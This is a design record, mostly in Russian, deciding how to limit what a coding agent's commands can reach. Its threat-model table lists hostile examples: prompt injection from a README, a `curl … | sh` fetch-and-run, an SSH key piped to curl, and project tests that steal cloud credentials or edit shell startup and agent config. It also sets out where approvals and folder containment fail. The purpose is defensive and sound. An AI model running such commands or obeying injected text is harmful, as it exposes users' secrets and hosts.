# ADR-0004: Keep the workspace boundary and approvals in 1.0, defer the OS sandbox to 1.x

Status: Proposed

Date: 2026-11-25

## Context

Задача 9.11 вехи M4 (`docs/architecture/proposals/dart-agent-and-clients/09-14-stage-9-switch-default.md`, пункт 11; `delivery-roadmap.md` §4.5) требует решения о песочнице ОС по модели угроз. Строка P-13 матрицы целей (`agent-parity-goals.md` §3.4) сейчас — Won't «сейчас»: «песочница требует трёх бэкендов ОС и отдельной модели угроз, пересмотреть после этапа 9». Критерий выхода M4: «ADR о песочнице ОС (9.11) принят, строка P-13 матрицы исправлена».

Варианты задачи 9.11 (`agent-core-architecture` §16.3): оставить границу папки и одобрения; песочница только на macOS; песочница на трёх ОС.

### Текущая граница исполнения

| Путь исполнения | Кто исполняет | Что ограничивает сейчас | Чего не ограничивает |
|---|---|---|---|
| `read`, `write`, `edit`, `ls`, `search` Dart-агента | `LocalExecutionEnv` (встроенный агент, `serve --local-exec`) или клиент по `fs/*` | `BoundedEnv`: нормализация, `realpath` самого длинного существующего префикса, сравнение по сегментам (ENV-2, ENV-3); политика разрешений и одобрение записи | гонку «проверка — операция» (TOCTOU) |
| `exec` Dart-агента | `LocalExecutionEnv` или клиент по `terminal/*` | одобрение в `standard`, критические шаблоны и в `bypass` (P-07), `cwd` в `BoundedEnv`, окружение по allowlist (ENV-6), таймаут и завершение дерева процессов (ENV-5) | **содержимое команды**: одобренная команда работает с правами пользователя — читает любые его файлы, пишет вне рабочей папки, ходит в сеть |
| stdio-серверы MCP | `StdioProcessTransport` агента | одна точка проверки на вызов (P-01), ограда результата (P-16), окружение по allowlist, доверие к проекту для проектных серверов | процесс сервера целиком: он запускается без одобрения и работает с правами пользователя |
| `fs/*` у клиента CodeLab | `AcpClientApplication` + `IoTextFileIo` | лексическая проверка пути по `cwd` сессии (`resolveWithinWorkingDirectory`) | символическую ссылку внутри папки, ведущую наружу |
| `terminal/*` у клиента CodeLab | `AcpClientApplication` + `IoTerminalProcessRunner` | лексическая проверка `cwd` | ссылку наружу в `cwd`; **окружение**: процесс получает всё окружение клиента, включая `CODELAB_SECRET_*` и `*_API_KEY` (REV-29, issue #506) |

Одобрение `fs/*` и `terminal/*` у клиента не требуется по ACP (`AGENTS.md` §10, исключение); компенсирующий контроль — containment рабочей папкой. Для этих методов containment — единственный рубеж клиента, а для стороннего агента — единственный рубеж вообще.

### Модель угроз исполнения

Это часть документа «Модель угроз» из нефункциональных документов 1.0 (`delivery-roadmap.md` §6.3), ограниченная исполнением команд и файлов. Сеть агента (`--ws`, токен, loopback) решена change `add-agent-remote-exec` и здесь не повторяется.

**Активы.**

* **A1** — файлы пользователя вне рабочей папки: ключи SSH и GPG, учётные данные облаков, другие репозитории, конфигурация оболочки.
* **A2** — секреты: ключи провайдеров и токены в окружении (`*_API_KEY`, `CODELAB_SECRET_*`), `$CODELAB_HOME/secrets.yaml`, связка ключей ОС.
* **A3** — код и данные рабочей папки: целостность и конфиденциальность.
* **A4** — `$CODELAB_HOME`: конфигурация агента, правила разрешений, журналы сессий.
* **A5** — хост: автозапуск (`~/.zshrc`, `~/Library/LaunchAgents`, `crontab`), процессы, исходящая сеть.

**Источники угроз.**

* **T1** — prompt injection через недоверенный ввод: файлы проекта, вывод команд, результаты MCP и web-инструментов. Модель предлагает вредный вызов.
* **T2** — ошибка модели без злого умысла: удаление не того каталога, `git push --force`.
* **T3** — недоверенный код проекта, который исполняет одобренная команда: `npm test`, `make`, хуки git, `postinstall`. Одобрение видит строку команды, а не код, который она запустит.
* **T4** — вредный или скомпрометированный stdio-сервер MCP.
* **T5** — сторонний ACP-агент (внешний профиль) и его запросы `fs/*` и `terminal/*` к клиенту.
* **T6** — другой локальный пользователь машины. Вне этого решения: права файлов клиента — REV-46, issue #529.

**Сценарии и меры.**

Столбец «Что ловит сейчас» описывает CodeLab-агента. У стороннего агента запросы `fs/*` и `terminal/*` к клиенту идут без одобрения и без критических шаблонов (`AGENTS.md` §10, исключение): его защищают только собственная политика агента и containment рабочей папки у клиента. Это касается всех строк, где источник — T1 или T2, если агент сторонний.

| # | Сценарий | Источник → актив | Что ловит сейчас | Что добавила бы песочница ОС |
|---|---|---|---|---|
| S1 | Текст в README велит выполнить `curl … \| sh` | T1 → A5 | `standard`: человек видит команду в одобрении; критический шаблон «загрузка с немедленным исполнением» спрашивает и в `bypass` | ничего сверх: команда уже остановлена |
| S2 | Модель под инъекцией выполняет `cat ~/.ssh/id_rsa \| curl -d @- …` | T1 → A1, A2 | `standard`: одобрение; `bypass`: ничего — это не критический шаблон | запрет чтения каталогов секретов и/или сети |
| S3 | Человек одобрил `npm test`, тест проекта читает `~/.aws/credentials` и дописывает `~/.zshrc` | T3 → A1, A2, A5 | ничего: одобрение получено честно | запись только в рабочую папку, запрет чтения каталогов секретов; выгрузка кода по сети остаётся, если сеть открыта |
| S4 | В репозитории ссылка `docs -> ~/.ssh`; сторонний агент читает `docs/id_rsa` через `fs/read_text_file` | T5 → A1 | у Dart-агента — `BoundedEnv`; у клиента — **ничего**: проверка лексическая | ничего: `fs/*` исполняет клиент, а не процесс в песочнице |
| S5 | Команда стороннего агента через `terminal/create` печатает `env` | T1, T5 → A2 | **ничего**: окружение клиента уходит целиком (REV-29) | частично; дешевле — не передавать секреты |
| S5b | Сторонний stdio-агент сам читает своё окружение или исполняет команды своим процессом, минуя `terminal/create` | T5 → A2 | **ничего**: процесс агента получает всё окружение клиента (`StdioAcpTransport`, вторая половина REV-29); мера — Q3 change `add-os-sandbox-decision` | ничего: процесс агента вне песочницы CodeLab |
| S6 | Проектный MCP-сервер при старте читает `~/.aws` и шлёт по сети | T4 → A1, A2 | доверие к проекту: проектный сервер не стартует без доверия | изоляция процесса сервера |
| S7 | Модель удаляет `../other-repo` командой | T2 → A1 | одобрение в `standard`; критический шаблон для корня, домашнего и системного каталогов | запись только в рабочую папку |
| S8 | Одобренная команда (`npm test`) переписывает `$CODELAB_HOME/config.yaml`: добавляет проект в `trusted_projects`, ослабляет `permissions.*`, добавляет stdio-сервер MCP | T3 → A4 | критические пути PERM-11 ловят только **текст** команды и пути инструментов `write`/`edit`, а не код, который команда запускает; живая перезагрузка откладывает `permissions.*`, `trusted_projects` и новые stdio-серверы до перезапуска (`agent-runtime`, «Живая перезагрузка конфигурации», R0-1), но после перезапуска они применяются без вопроса | запись только в рабочую папку закрывает `$CODELAB_HOME` |
| S9 | Сторонний агент через `fs/write_text_file` (без одобрения) дописывает в `.codelab/config.yaml` проекта stdio-сервер MCP | T5, T1 → A4, A5 | проект **не** в `trusted_projects`: `mcp.servers`, `providers`, `hooks`, `exec` проектного слоя отбрасываются (`applyProjectTrust`, `codelab_agent_core/lib/src/config/trust.dart`); проект доверенный: доверие привязано к корню, а не к содержимому — новый сервер не стартует до перезапуска агента, а после перезапуска CodeLab-агент запускает его без вопроса | ничего: запись идёт внутри рабочей папки |

**Выводы.**

1. S4 и S5 — дыры в **существующей** границе, а не отсутствие песочницы. Их закрывают дешёвые изменения клиента, и они касаются всех агентов, включая сторонние. S5b ими не закрывается: процесс стороннего агента получает окружение клиента (Q3).
2. Песочница ОС — единственная мера против S3, S6, S8 и против S2 в `bypass`. Одобрение здесь не помогает по построению.
3. Даже песочница с записью только в папку проекта не защищает A3 от выгрузки по сети, если сеть открыта. А закрытая сеть ломает `npm install`, `pip install`, `git fetch`.
4. Готовая изоляция уровня ОС доступна уже сейчас: агент в контейнере или виртуальной машине (`codelab-agent serve --local-exec`, change `add-agent-remote-exec`; devcontainer). Для недоверенных репозиториев это сильнее любой песочницы процесса.
5. S9 показывает, что доверие к проекту привязано к корню, а не к содержимому конфига: доверенный проект, в который агент или `git pull` добавил сервер, запускает его после перезапуска. Это не задача песочницы; кандидат — подтверждение доверия при изменении проектного конфига (вне этого решения, запись в backlog).

### Цена бэкендов

| Бэкенд | Как подключается из Dart | Ограничения |
|---|---|---|
| macOS Seatbelt (`/usr/bin/sandbox-exec -p <профиль>`) | обёртка командной строки в `Process.start`, без нативного кода | поставляется с ОС, но `sandbox-exec` помечен устаревшим в man-странице, язык профилей SBPL не документирован; сеть фильтруется по адресу и порту (`remote tcp "*:443"`, loopback), но не по имени хоста — разрешить «только registry.npmjs.org» нельзя; дочерние процессы наследуют профиль |
| Linux bubblewrap (`bwrap`) | обёртка командной строки | внешняя утилита, по умолчанию стоит не везде; нужны непривилегированные user namespaces — на части дистрибутивов они выключены или ограничены (AppArmor в Ubuntu 24.04); сеть — `--unshare-net`, всё или ничего |
| Linux Landlock и seccomp | нужен вызов в дочернем процессе до `exec`; у `Process.start` нет такого хука — нужен нативный помощник (C или Rust) | Landlock для файлов — ядро 5.13+, для TCP-портов — 6.7+; seccomp фильтрует системные вызовы, а не пути; помощник — новая технология сборки для пяти целей, подпись и нотаризация |
| Windows: AppContainer, ограниченный токен, Job Objects | `CreateProcess` с атрибутами безопасности — через `dart:ffi` или нативный помощник | AppContainer не видит файлы пользователя без выдачи ACL на папку проекта SID контейнера — это правка прав файлов пользователя; Job Objects ограничивают ресурсы и дерево процессов, но не файлы и не сеть |

Общая цена любого бэкенда: профиль, который не ломает инструменты (кэши `~/.npm`, `~/.cache`, `~/.gradle`, `~/Library/Caches`, `DerivedData`), понятная модели ошибка нарушения и сопровождение профиля при обновлениях ОС.

## Decision

Рекомендация — вариант «граница папки и одобрения в 1.0, песочница ОС в 1.x». Окончательный выбор — за пользователем (Q1 change `add-os-sandbox-decision`); до него статус ADR — Proposed.

### 1. В 1.0 песочницы ОС нет

Граница исполнения 1.0 — `BoundedEnv`, политика разрешений с одобрением и критическими шаблонами, окружение процессов по allowlist (ENV-6), профили хостов и ограда недоверенного вывода. Команды и stdio-серверы MCP работают с правами пользователя. Это явное ограничение 1.0, а не пробел: оно описывается в пользовательской документации вместе с рекомендацией из п. 3.

### 2. В 1.0 закрываются дыры существующей границы на стороне клиента

Это две отдельные меры 1.0, каждая в своём change:

* **раскрытие символических ссылок** в containment `fs/*` и `cwd` `terminal/create` (S4) — change `fix-acp-client-symlink-containment`: порт `PathCanonicalizer`, двухступенчатая проверка, семантика `realpath -m`, fail-closed с `-32602`;
* **окружение `terminal/create` по allowlist** хоста плюс `env` запроса вместо всего окружения клиента (S5; часть REV-29, касающаяся команд) — change `add-os-sandbox-decision`.

ACP не меняется: коды ошибок прежние (`-32602` для пути вне папки), новых полей и методов нет. Окружение процесса `terminal/create` ACP не определяет: `10-Terminal.md` говорит, что методы позволяют агенту исполнять команды «within the Client's environment», а `env` — «Environment variables for the command». «Среда клиента» здесь — машина и рабочая папка клиента, на которой идёт команда, в противоположность среде агента; обязанности передать процессу переменные окружения клиента текст не содержит, а единственный механизм переменных — явный `env` запроса. Поэтому allowlist — политика клиента в пределах протокола.

### 3. Изоляция уровня ОС в 1.0 — контейнер или виртуальная машина

Для недоверенных репозиториев документация рекомендует запускать агента в контейнере или ВМ (`codelab-agent serve --local-exec`, devcontainer). Кода для этого не нужно.

Документация отдельно предупреждает о режиме `bypass`: в нём команды идут без вопроса, кроме критических шаблонов, и S2 не ловится ничем. С недоверенным репозиторием `bypass` допустим только внутри контейнера или ВМ.

### 4. P-13 — Could, веха M5 (1.x), первым бэкендом — macOS

Строка P-13 матрицы получает приоритет Could и этап 9+ (веха M5). Первый бэкенд — macOS Seatbelt: он не требует нативного кода и поставок. Linux и Windows — отдельными решениями после него; Landlock и seccomp или Windows-API требуют нативного помощника, а это новая технология (`AGENTS.md` §4) и отдельный ADR.

### 5. Опорный дизайн для change песочницы (1.x)

Это ориентир будущего change, а не реализуемое требование. Будущий change МОЖЕТ отступить от него с обоснованием.

* **Что изолируется.** `exec` Dart-агента в `LocalExecutionEnv` (встроенный агент и `serve --local-exec`). stdio-серверы MCP — по ключу на сервер, выключено по умолчанию: серверам нужны сеть и их конфигурация в домашнем каталоге. `terminal/*` у клиента не изолируются: клиент исполняет команды стороннего агента, и решение о них — отдельный вопрос.
* **Файлы.** Запись — корень сессии, временный каталог сессии и явный список кэшей инструментов. Чтение — всё, кроме списка каталогов секретов (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gcloud`, `$CODELAB_HOME/secrets.yaml`, связки ключей).
* **Сеть.** По умолчанию открыта, ключ `deny` закрывает её. Фильтра по доменам в первой версии нет.
* **Нет бэкенда.** Ключ вида `exec.sandbox: off | auto | required`: `auto` — песочница, если бэкенд есть, иначе предупреждение один раз; `required` — `exec` недоступен с причиной (fail closed). Умолчание выбирает тот change.
* **Режимы разрешений.** Песочница не ослабляет политику: одобрения и критические шаблоны остаются. «Без вопроса внутри песочницы» — отдельное решение того change.
* **`--local-exec`.** Песочница работает на машине агента так же, как во встроенном агенте.
* **Место.** Декоратор оболочки в `codelab_agent_io` рядом с `LocalExecutionEnv`; ядро получает только тип конфигурации. Новых пакетов нет. ACP не меняется.
* **Источник.** Если профиль Seatbelt близко воспроизводит профиль стороннего проекта, источник указывается в документе, в комментарии кода и в `THIRD_PARTY_NOTICES.md` (`AGENTS.md` §5).

## Alternatives

### Alternative 1 — Окончательный Won't без срока пересмотра

Снять пометку «сейчас» и оставить P-13 Won't.

Почему не рекомендуется:

* S3 и S6 остаются без меры навсегда, а прочие агенты с песочницей задают ожидание пользователей;
* решение без триггера пересмотра устаревает молча.

### Alternative 2 — Песочница macOS в 1.0

Реализовать Seatbelt-бэкенд в вехе M4 (опорный дизайн п. 5).

Почему не рекомендуется:

* M4 — веха выпуска: подписанные дистрибутивы, установщик, правовые документы; новый механизм с риском регрессий инструментов растягивает её;
* защищает только пользователей macOS, включивших режим; дыры S4 и S5 касаются всех и закрываются дешевле;
* опорный дизайн выигрывает от опыта 1.0: какие кэши и пути реально нужны инструментам.

### Alternative 3 — Песочница на трёх ОС

Seatbelt, bubblewrap или Landlock, Windows AppContainer.

Почему не рекомендуется:

* два из трёх бэкендов требуют нативного помощника (новая технология, сборка и подпись для пяти целей) или внешней утилиты с непредсказуемой доступностью;
* AppContainer требует менять ACL файлов пользователя;
* объём сопоставим с этапом, а не с задачей вехи.

### Alternative 4 — Песочница для `terminal/*` у клиента

Клиент заворачивает команды любого агента в песочницу.

Почему не выбран сейчас:

* клиент не знает, какие пути и сеть нужны стороннему агенту, и сломает его команды без объяснения в протоколе;
* для CodeLab-агента изоляция естественнее на стороне агента (п. 5), где известны сессия и политика.

## Consequences

### Positive

* Containment клиента для `fs/*` и `terminal/*` становится равным границе агента: ссылка наружу не проходит, а команды `terminal/create` не видят окружение клиента сверх allowlist. Процесс стороннего агента по-прежнему видит всё окружение клиента (S5b, Q3).
* Ограничения 1.0 описаны честно: пользователь знает, что одобренная команда работает с его правами, и как изолировать недоверенный репозиторий.
* Песочница получает приоритет, веху и опорный дизайн — следующий change не начинает с нуля.

### Negative

* В 1.0 одобренная команда и код проекта, который она запускает, имеют все права пользователя (S2 в `bypass`, S3, S6, S8).
* Команды сторонних агентов через `terminal/create` перестают видеть переменные клиента вне allowlist (`NVM_DIR`, `JAVA_HOME`, `SSH_AUTH_SOCK` и т. п.). Агент может передать их явно в `env`.

### Risks

* Allowlist окружения ломает сценарий стороннего агента, рассчитывающего на окружение клиента → видно в выводе команды; агент передаёт переменные в `env`; если жалоб много — настраиваемый список в профиле (Q2 change).
* Раскрытие ссылок (`fix-acp-client-symlink-containment`) — проверка до операции: подмена ссылки между проверкой и операцией (TOCTOU) не закрывается. Так же и у `BoundedEnv`; закрыть может только песочница ОС или открытие файлов без перехода по ссылкам, которого в `dart:io` нет.
* Пересмотр: решение пересматривается при инциденте с исполнением команды или MCP-сервера и при планировании вехи M5 — что наступит раньше.
* `sandbox-exec` могут убрать из macOS → опорный дизайн оставляет бэкенд за декоратором; отказ бэкенда при `auto` — не авария.

---

## Migration

Не требуется. Конфигурации, журналы и профили не меняются. Изменение поведения клиента (окружение `terminal/create`, отказ по ссылке наружу) описывается в разделе выпуска `CHANGELOG.md`.

Откат каждой меры — возврат прежнего адаптера в её change; данных не затрагивает.
